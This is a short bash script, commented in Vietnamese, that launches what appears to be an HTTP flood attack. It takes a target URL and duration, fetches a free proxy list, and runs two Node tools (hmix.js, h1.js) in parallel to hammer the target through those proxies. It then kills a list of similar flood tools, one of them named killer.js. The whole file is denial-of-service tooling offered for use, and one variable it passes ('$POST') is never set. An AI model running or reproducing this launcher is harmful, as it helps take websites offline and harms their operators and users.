#!/bin/bash

# Usage: ./script.sh <URL> <TIME>
[ $# -lt 2 ] && echo "Usage: $0 {URL} {TIME}" && exit 1

URL=$1
TIME=$2

# Tải proxy HTTP thẳng vào live.txt
curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&ssl=all&timeout=1000" > live.txt

export NODE_OPTIONS=--max-old-space-size=8192

node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt --full true -d false &

node h1.js "$POST" "$URL" live.txt "$TIME" 999 10 randomstring="true" &



wait
pkill -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js"
